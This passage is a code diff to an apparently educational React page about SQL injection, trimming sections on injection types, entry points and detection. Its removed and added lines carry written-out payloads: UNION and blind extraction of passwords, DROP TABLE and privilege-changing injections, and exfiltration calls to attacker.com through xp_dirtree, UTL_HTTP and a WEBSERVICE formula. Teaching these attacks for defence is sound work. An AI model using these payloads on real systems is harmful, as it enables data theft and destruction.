-                  <ListItem><ListItemText primary="Never build SQL by concatenating strings with user input" /></ListItem>
+                  <ListItem><ListItemText primary="The database parses the SQL structure FIRST, before seeing any data" /></ListItem>
+                  <ListItem><ListItemText primary="Parameters are sent separately from the SQL command" /></ListItem>
+                  <ListItem><ListItemText primary="The database knows parameters are DATA and cannot change query structure" /></ListItem>
+                  <ListItem><ListItemText primary="Query plans can be safely cached for better performance" /></ListItem>
                 </List>
               </Alert>
             </Paper>
@@ -2332,50 +1857,9 @@ SELECT * FROM products WHERE id = CONVERT(int, @@version)
                 SQL Injection Types
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Not all SQL injection attacks work the same way. Depending on how the application responds (or doesn't respond)
-                to injected SQL, attackers use different techniques to extract information or confirm the vulnerability exists.
-                Understanding these types is important for both testing applications and defending them.
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                The main categories are based on <strong>how the attacker receives feedback</strong>. In some cases, the application
-                shows database results or errors directly (in-band). In other cases, the attacker must infer information from
-                indirect signals like timing delays or response differences (blind/inferential). Let's explore each type:
-              </Typography>
-
-              {/* Classification Overview */}
-              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
-                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
-                  How SQLi Types are Classified
-                </Typography>
-                <Grid container spacing={2}>
-                  <Grid item xs={12} md={4}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>In-Band (Classic)</Typography>
-                    <Typography variant="body2" color="text.secondary">
-                      Results come back through the same channel as the attack. The attacker can see query results or error messages
-                      directly in the application's response. This is the easiest to exploit.
-                    </Typography>
-                  </Grid>
-                  <Grid item xs={12} md={4}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Blind (Inferential)</Typography>
-                    <Typography variant="body2" color="text.secondary">
-                      No direct output is visible. The attacker must infer information through indirect signals: response time differences,
-                      content changes, or HTTP status codes. Slower but still dangerous.
-                    </Typography>
-                  </Grid>
-                  <Grid item xs={12} md={4}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Out-of-Band</Typography>
-                    <Typography variant="body2" color="text.secondary">
-                      Data is exfiltrated through a different channel entirely - like DNS requests or HTTP calls from the database
-                      server to an attacker-controlled system. Used when other methods fail.
-                    </Typography>
-                  </Grid>
-                </Grid>
-              </Paper>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                The Six Main Types of SQL Injection
+              <Typography variant="body1" sx={{ mb: 3 }}>
+                SQL injection attacks are categorized based on how data is extracted or how the attack is confirmed.
+                Understanding these types helps in both detection and prevention.
               </Typography>
 
               <Grid container spacing={3}>
@@ -2407,285 +1891,57 @@ SELECT * FROM products WHERE id = CONVERT(int, @@version)
                 ))}
               </Grid>
 
-              {/* Detailed explanations for each type */}
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                Understanding Each Type in Detail
-              </Typography>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#ef4444", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#ef4444" }}>Error-Based SQL Injection</Typography>
+              <Accordion sx={{ mt: 3, borderRadius: "12px !important", "&:before": { display: "none" } }}>
+                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
+                  <Typography sx={{ fontWeight: 700 }}>Blind SQL Injection Deep Dive</Typography>
                 </AccordionSummary>
                 <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Error-based SQLi is often the <strong>first type discovered</strong> during testing because it's so visible.
-                    When an application displays database error messages to users, attackers can intentionally cause errors that
-                    reveal information about the database structure, table names, or even actual data.
+                  <Typography variant="body2" sx={{ mb: 2 }}>
+                    Blind SQL injection is used when the application doesn't display query results or database errors directly.
+                    Attackers must infer information through indirect signals.
                   </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker crafts input that causes a SQL syntax error or type conversion error.
-                    The error message often contains the original query, table names, column names, or data values. Even a simple
-                    "You have an error in your SQL syntax" reveals the application is vulnerable.
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- Attacker enters a single quote to break the query:
-Input: '
+                  <Grid container spacing={2}>
+                    <Grid item xs={12} md={6}>
+                      <Paper sx={{ p: 2, bgcolor: alpha("#eab308", 0.05), borderRadius: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#eab308", mb: 1 }}>Boolean-Based</Typography>
+                        <Typography variant="body2" sx={{ mb: 1 }}>
+                          Send queries that produce different responses for true/false conditions.
+                        </Typography>
+                        <CodeBlock
+                          language="sql"
+                          code={`-- True condition (different response)
+id=1 AND 1=1
 
--- This might produce an error like:
--- "You have an error in your SQL syntax; check the manual near ''' at line 1"
+-- False condition (different response)
+id=1 AND 1=2
 
--- More advanced: Force an error that reveals data
--- In SQL Server, this extracts the username through an error:
-Input: ' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--
+-- Extract data character by character
+id=1 AND SUBSTRING(username,1,1)='a'`}
+                        />
+                      </Paper>
+                    </Grid>
+                    <Grid item xs={12} md={6}>
+                      <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>Time-Based</Typography>
+                        <Typography variant="body2" sx={{ mb: 1 }}>
+                          Use database delay functions to confirm injection and extract data.
+                        </Typography>
+                        <CodeBlock
+                          language="sql"
+                          code={`-- MySQL: delay 5 seconds if true
+id=1 AND SLEEP(5)
 
--- Error: "Conversion failed when converting the nvarchar value 'admin' to int"
--- The attacker now knows there's a user called 'admin'!`}
-                  />
-                  <Alert severity="info" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      <strong>Defense tip:</strong> Never display raw database errors to users. Log them server-side and show
-                      generic error messages like "An error occurred. Please try again."
-                    </Typography>
-                  </Alert>
+-- MSSQL: delay 5 seconds if true
+id=1; WAITFOR DELAY '0:0:5'--
+
+-- Extract data via timing
+id=1 AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)`}
+                        />
+                      </Paper>
+                    </Grid>
+                  </Grid>
                 </AccordionDetails>
               </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#f97316", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#f97316" }}>Union-Based SQL Injection</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    UNION-based SQLi is one of the most powerful techniques when the application displays query results.
-                    The SQL <code>UNION</code> operator combines results from multiple SELECT statements, allowing attackers
-                    to append their own query and have its results appear in the application's output.
-                  </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker first determines how many columns the original query returns
-                    (they must match). Then they craft a UNION SELECT that retrieves data from other tables, which appears
-                    alongside the legitimate results.
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- Original query (retrieving products):
-SELECT name, description, price FROM products WHERE category = 'electronics'
-
--- Step 1: Determine the number of columns
--- Try adding NULLs until no error:
-' UNION SELECT NULL--           -- Error (wrong column count)
-' UNION SELECT NULL,NULL--      -- Error (wrong column count)
-' UNION SELECT NULL,NULL,NULL-- -- Success! Query has 3 columns
-
--- Step 2: Find which columns display text
-' UNION SELECT 'a','b','c'--    -- See which positions show 'a', 'b', or 'c'
-
--- Step 3: Extract sensitive data
-' UNION SELECT username, password, email FROM users--
-
--- The user credentials now appear as "products" in the page!`}
-                  />
-                  <Alert severity="warning" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      <strong>Key requirement:</strong> UNION attacks require the same number of columns with compatible
-                      data types. Attackers typically use NULL (which is compatible with any type) to probe.
-                    </Typography>
-                  </Alert>
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#eab308", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#eab308" }}>Boolean-Based Blind SQL Injection</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    When an application doesn't show query results or errors, attackers use "blind" techniques. Boolean-based
-                    blind SQLi works by asking the database yes/no questions and observing how the response changes.
-                  </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker injects conditions that are either true or false. If the application
-                    behaves differently (different content, different page, different status code), the attacker can infer
-                    information one bit at a time.
-                  </Typography>
-                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#eab308", 0.05), borderRadius: 2 }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Extracting a Password Character by Character</Typography>
-                    <CodeBlock
-                      language="sql"
-                      code={`-- Assume a product page: /product?id=1
--- Normal response shows the product. Let's extract the admin password.
-
--- Step 1: Confirm injection works
-/product?id=1 AND 1=1    -- Response: Product shows (TRUE condition)
-/product?id=1 AND 1=2    -- Response: Product missing (FALSE condition)
--- Different responses confirm we can inject boolean conditions!
-
--- Step 2: Ask questions about the password
-/product?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
--- If product shows → first character is 'a'
--- If product missing → first character is NOT 'a'
-
--- Step 3: Try each character until we find it
-...='a'  -- Missing (false)
-...='b'  -- Missing (false)
-...='p'  -- Shows! First character is 'p'
-
--- Step 4: Move to next character
-/product?id=1 AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a'
--- Repeat for each position...
-
--- Eventually we extract: "password123" (very slow, but works!)`}
-                    />
-                  </Paper>
-                  <Alert severity="info" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      This technique is slow (one character at a time, with ~30-100 requests per character) but reliable.
-                      Automated tools like SQLMap make this practical.
-                    </Typography>
-                  </Alert>
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#22c55e", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#22c55e" }}>Time-Based Blind SQL Injection</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    When even the response content doesn't change, attackers can use timing. Time-based blind SQLi makes the
-                    database wait before responding. If the response is delayed, the attacker knows their condition was true.
-                  </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker injects a conditional time delay (like SLEEP or WAITFOR).
-                    If the condition is true, the database waits. If false, it responds immediately. The attacker measures
-                    response times to infer information.
-                  </Typography>
-                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Confirming Vulnerability with Timing</Typography>
-                    <CodeBlock
-                      language="sql"
-                      code={`-- Test if the application is vulnerable:
-/product?id=1; WAITFOR DELAY '0:0:5'--     -- MSSQL
-/product?id=1 AND SLEEP(5)--                -- MySQL
-
--- If the response takes 5 seconds longer than normal, SQLi is confirmed!
-
--- Extracting data with timing:
--- "If the first character of the admin password is 'a', wait 5 seconds"
-/product?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
-
--- Response time: 200ms → Not 'a'
--- Response time: 200ms → Not 'b'
--- ...
--- Response time: 5200ms → It's 'p'!
-
--- Move to next character and repeat...`}
-                    />
-                  </Paper>
-                  <Alert severity="warning" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      Time-based attacks are very slow and can be affected by network latency. Attackers typically use shorter
-                      delays (1-2 seconds) and statistical analysis to account for variable response times.
-                    </Typography>
-                  </Alert>
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#3b82f6", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#3b82f6" }}>Out-of-Band SQL Injection</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Out-of-band (OOB) SQLi uses a completely different channel to exfiltrate data. Instead of reading results
-                    from the HTTP response, the attacker makes the database server send data to an external system they control.
-                  </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker injects SQL that makes the database perform a DNS lookup or
-                    HTTP request containing the stolen data. The attacker monitors their own server to receive the data.
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- DNS exfiltration (MSSQL):
--- Make the database resolve a DNS name that includes stolen data
-'; EXEC master..xp_dirtree '\\\\'+password+'.attacker.com\\share'--
-
--- The attacker's DNS server receives a lookup for:
--- "secretpassword123.attacker.com"
--- They just extracted the password through DNS!
-
--- HTTP exfiltration (Oracle):
-SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users WHERE username='admin'
-
--- The attacker's web server logs:
--- GET /secretpassword123 HTTP/1.1
--- They captured the password in their access logs!`}
-                  />
-                  <Alert severity="info" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      OOB attacks require the database server to have outbound network access (which it often shouldn't).
-                      This technique works when in-band and blind methods fail, or when responses aren't reliable.
-                    </Typography>
-                  </Alert>
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#8b5cf6", 0.05) }}>
-                  <Typography sx={{ fontWeight: 700, color: "#8b5cf6" }}>Second-Order SQL Injection</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Second-order (or stored) SQLi is sneaky because the attack doesn't trigger immediately. Malicious input
-                    is stored in the database first, then later retrieved and used in a vulnerable query elsewhere.
-                  </Typography>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    <strong>How it works:</strong> The attacker stores malicious SQL as data (e.g., in their username).
-                    Later, when an admin views users or the system processes that data, the stored SQL gets executed.
-                  </Typography>
-                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Malicious Username</Typography>
-                    <CodeBlock
-                      language="sql"
-                      code={`-- Step 1: Attacker registers with a malicious username
--- The registration form safely escapes input, so no immediate attack:
-Username: admin'--
-Password: anything
-
--- The username is stored safely in the database as literal text:
-INSERT INTO users (username, password) VALUES ('admin''--', 'hashed_password')
--- (Single quotes are escaped to '', so no injection here)
-
--- Step 2: Later, an admin views the user list
--- The application retrieves the username and uses it in another query:
-SELECT * FROM audit_log WHERE username = '[username_variable]'
-
--- If this second query doesn't use parameters, it becomes:
-SELECT * FROM audit_log WHERE username = 'admin'--'
--- The -- comments out the rest, and the attacker sees admin's logs!
-
--- Or worse, for password reset:
-UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
--- This resets the REAL admin's password!`}
-                    />
-                  </Paper>
-                  <Alert severity="error" sx={{ mt: 2 }}>
-                    <Typography variant="body2">
-                      <strong>Critical lesson:</strong> Don't assume data from your own database is safe! If it originally came
-                      from a user, it must be parameterized every time it's used in a query, even internally.
-                    </Typography>
-                  </Alert>
-                </AccordionDetails>
-              </Accordion>
-
-              <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Key Insight for Defenders</AlertTitle>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  All these attack types exploit the same root cause: <strong>user input becoming part of SQL code</strong>.
-                  The defense is the same regardless of attack type: use parameterized queries everywhere. Don't try to detect
-                  or filter attack patterns - properly separate code from data, and none of these techniques will work.
-                </Typography>
-              </Alert>
             </Paper>
 
             {/* ========== SECTION: ENTRY POINTS ========== */}
@@ -2705,51 +1961,26 @@ UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
                 Common Entry Points
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                SQL injection can occur anywhere user-controlled data flows into a database query. Understanding where
-                to look for vulnerabilities is crucial for both testers and developers. The key question is: <strong>
-                "Does any user input reach a SQL query?"</strong> If yes, that's a potential entry point.
+              <Typography variant="body1" sx={{ mb: 3 }}>
+                SQL injection can occur anywhere user input flows into a database query. These are the most common entry points to audit.
               </Typography>
-
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                Entry points aren't just obvious form fields. Attackers think creatively about all the ways data enters
-                an application. Let's explore the most common and often-overlooked attack surfaces:
-              </Typography>
-
-              {/* Analogy Box */}
-              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
-                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
-                  Think Like a Detective
-                </Typography>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  Imagine every piece of data that enters your application as a potential carrier of malicious SQL.
-                  This includes the obvious (form fields, search boxes) but also the subtle (HTTP headers your app logs,
-                  filenames from uploads, data imported from spreadsheets). If it touches a database query, it needs protection.
-                </Typography>
-              </Paper>
 
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
                   <Paper sx={{ p: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                     <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>High-Risk Entry Points</Typography>
-                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
-                      These are the most commonly exploited locations. Test these first:
-                    </Typography>
                     <List dense>
                       {[
-                        { text: "Login and authentication forms", desc: "Username and password fields directly query the users table" },
-                        { text: "Search boxes and filters", desc: "User input often becomes part of WHERE clauses" },
-                        { text: "URL query parameters (?id=1, ?sort=name)", desc: "Visible in the browser address bar, easy to manipulate" },
-                        { text: "POST body parameters (forms, JSON)", desc: "Hidden from URL but still sent to the server" },
-                        { text: "HTTP headers (User-Agent, Referer, X-Forwarded-For)", desc: "Often logged or processed without sanitization" },
-                        { text: "Cookies (session identifiers, preferences)", desc: "Stored on client, can be modified by attackers" },
+                        "Login and authentication forms",
+                        "Search boxes and filters",
+                        "URL query parameters (?id=1, ?sort=name)",
+                        "POST body parameters (forms, JSON)",
+                        "HTTP headers (User-Agent, Referer, X-Forwarded-For)",
+                        "Cookies (session identifiers, preferences)",
                       ].map((item, idx) => (
-                        <ListItem key={idx} sx={{ flexDirection: "column", alignItems: "flex-start" }}>
-                          <Box sx={{ display: "flex", alignItems: "center", width: "100%" }}>
-                            <ListItemIcon sx={{ minWidth: 32 }}><WarningIcon sx={{ color: "#ef4444" }} fontSize="small" /></ListItemIcon>
-                            <ListItemText primary={item.text} primaryTypographyProps={{ fontWeight: 600 }} />
-                          </Box>
-                          <Typography variant="caption" color="text.secondary" sx={{ pl: 4 }}>{item.desc}</Typography>
+                        <ListItem key={idx}>
+                          <ListItemIcon><WarningIcon sx={{ color: "#ef4444" }} fontSize="small" /></ListItemIcon>
+                          <ListItemText primary={item} />
                         </ListItem>
                       ))}
                     </List>
@@ -2758,24 +1989,18 @@ UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
                 <Grid item xs={12} md={6}>
                   <Paper sx={{ p: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
                     <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>Often Overlooked Vectors</Typography>
-                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
-                      These are frequently missed during security reviews:
-                    </Typography>
                     <List dense>
                       {[
-                        { text: "File upload names and metadata", desc: "Filename might be stored in database and queried later" },
-                        { text: "CSV/Excel import fields", desc: "Bulk imports often skip input validation" },
-                        { text: "API endpoints with complex filters", desc: "Rich query languages like OData or GraphQL can be abused" },
-                        { text: "GraphQL arguments", desc: "Flexible query structure can hide injection points" },
-                        { text: "Admin panels and internal tools", desc: "Often built quickly without security focus" },
-                        { text: "Report builders with custom queries", desc: "User-defined filters may directly become SQL" },
+                        "File upload names and metadata",
+                        "CSV/Excel import fields",
+                        "API endpoints with complex filters",
+                        "GraphQL arguments",
+                        "Admin panels and internal tools",
+                        "Report builders with custom queries",
                       ].map((item, idx) => (
-                        <ListItem key={idx} sx={{ flexDirection: "column", alignItems: "flex-start" }}>
-                          <Box sx={{ display: "flex", alignItems: "center", width: "100%" }}>
-                            <ListItemIcon sx={{ minWidth: 32 }}><VisibilityIcon sx={{ color: "#f59e0b" }} fontSize="small" /></ListItemIcon>
-                            <ListItemText primary={item.text} primaryTypographyProps={{ fontWeight: 600 }} />
-                          </Box>
-                          <Typography variant="caption" color="text.secondary" sx={{ pl: 4 }}>{item.desc}</Typography>
+                        <ListItem key={idx}>
+                          <ListItemIcon><VisibilityIcon sx={{ color: "#f59e0b" }} fontSize="small" /></ListItemIcon>
+                          <ListItemText primary={item} />
                         </ListItem>
                       ))}
                     </List>
@@ -2783,139 +2008,13 @@ UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
                 </Grid>
               </Grid>
 
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                Real-World Entry Point Examples
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Let's look at specific examples of how each entry point might be vulnerable:
-              </Typography>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>URL Parameters (GET Requests)</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    URL parameters are the most visible entry point. When you see a URL like <code>/product?id=123</code>,
-                    that <code>id</code> parameter likely goes into a database query. Attackers simply modify the URL in their browser.
-                  </Typography>
-                  <CodeBlock
-                    language="text"
-                    code={`Original URL:
-https://shop.example.com/product?id=123
-
-Attack URL:
-https://shop.example.com/product?id=123' OR '1'='1'--
-
-Other variations to try:
-?id=123; DROP TABLE products--
-?id=123 UNION SELECT username,password FROM users--
-?category=electronics' AND 1=1--`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>Form Fields (POST Requests)</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Login forms, registration forms, contact forms, and search boxes all send POST data. While not visible
-                    in the URL, attackers can easily modify these using browser developer tools or tools like Burp Suite.
-                  </Typography>
-                  <CodeBlock
-                    language="text"
-                    code={`Login Form Attack:
-Username: admin'--
-Password: anything
-(This might comment out the password check)
-
-Search Form Attack:
-Search: laptop' UNION SELECT credit_card, cvv, expiry FROM payments--
-(This might return payment data instead of products)
-
-Contact Form (stored for later viewing):
-Name: John'; DROP TABLE messages--
-(This might execute when admin views messages)`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>HTTP Headers</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Applications often log HTTP headers for analytics or security purposes. If these logged values are
-                    later used in queries (e.g., "show me all visits from this IP"), they become injection points.
-                  </Typography>
-                  <CodeBlock
-                    language="text"
-                    code={`User-Agent Header (logged for analytics):
-User-Agent: Mozilla/5.0' OR '1'='1'--
-
-X-Forwarded-For Header (logged for IP tracking):
-X-Forwarded-For: 192.168.1.1' UNION SELECT password FROM users WHERE username='admin'--
-
-Referer Header (logged for marketing):
-Referer: https://google.com'; DELETE FROM logs WHERE '1'='1
-
-Cookie (preferences stored in DB):
-Cookie: theme=dark'; UPDATE users SET role='admin' WHERE username='attacker'--`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>File Uploads and Imports</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    When users upload files, the filename is often stored in a database. When bulk data is imported
-                    from CSV or Excel files, each cell value might be inserted via SQL queries.
-                  </Typography>
-                  <CodeBlock
-                    language="text"
-                    code={`Malicious Filename:
-profile_photo'; DROP TABLE users--.jpg
-(Filename stored in database, might execute during listing)
-
-CSV Import Attack (each row becomes an INSERT):
-Name,Email,Phone
-John,john@test.com,555-1234
-'; DELETE FROM users--,fake@test.com,555-0000
-(The Name field contains malicious SQL)
-
-Excel Import with Formula:
-Cell A1: =WEBSERVICE("http://attacker.com/"&A2)
-(Could exfiltrate data if formulas are processed)`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
               <Alert severity="warning" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Remember: Second-Order Injection</AlertTitle>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  Even if input is safely stored initially, it can cause injection later if used unsafely. Example: A user
-                  registers with username <code>admin'--</code>. The registration uses parameterized queries (safe!). But later,
-                  an admin panel displays users with a vulnerable query - now the stored username triggers injection.
-                  <strong> Rule: Parameterize queries even when using data from your own database.</strong>
+                <AlertTitle sx={{ fontWeight: 700 }}>Second-Order Injection</AlertTitle>
+                <Typography variant="body2">
+                  Second-order SQLi occurs when malicious input is stored first, then used later in a different query.
+                  Example: A username containing SQL is stored during registration, then triggers injection when an admin
+                  views the user list. Always parameterize queries even when using data from your own database.
                 </Typography>
-              </Alert>
-
-              <Alert severity="info" sx={{ mt: 2, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Testing Checklist for Entry Points</AlertTitle>
-                <List dense>
-                  <ListItem><ListItemText primary="1. Identify all inputs: forms, URLs, headers, cookies, files, APIs" /></ListItem>
-                  <ListItem><ListItemText primary="2. Trace each input: Does it reach a database query? How is it used?" /></ListItem>
-                  <ListItem><ListItemText primary={`3. Test with special characters: ' " ; -- # /* to see if errors occur`} /></ListItem>
-                  <ListItem><ListItemText primary="4. Check for differences: Does changing input change the response in unexpected ways?" /></ListItem>
-                  <ListItem><ListItemText primary="5. Don't forget stored data: Test what happens when stored data is retrieved and used" /></ListItem>
-                </List>
               </Alert>
             </Paper>
 
@@ -2936,39 +2035,22 @@ Cell A1: =WEBSERVICE("http://attacker.com/"&A2)
                 Detection & Indicators
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                How do you know if someone is attempting SQL injection against your application? Or if you're testing,
-                how do you confirm a vulnerability exists? Detection involves looking for specific signals and patterns
-                that indicate SQL injection attempts or successful exploitation.
+              <Typography variant="body1" sx={{ mb: 3 }}>
+                Detecting SQL injection attempts requires monitoring multiple signals across application logs,
+                database audit logs, and network traffic.
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                There are two perspectives on detection: <strong>as a tester/attacker</strong> (looking for signs that injection
-                is possible) and <strong>as a defender</strong> (monitoring for attack attempts). Let's cover both:
-              </Typography>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                For Testers: Signs That SQLi Might Work
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                When testing an application (with authorization!), these signals suggest a SQL injection vulnerability exists:
-              </Typography>
-
-              <Grid container spacing={3} sx={{ mb: 4 }}>
+              <Grid container spacing={3}>
                 <Grid item xs={12} md={4}>
                   <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#ef4444", 0.03), height: "100%" }}>
                     <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
-                      Error-Based Signals
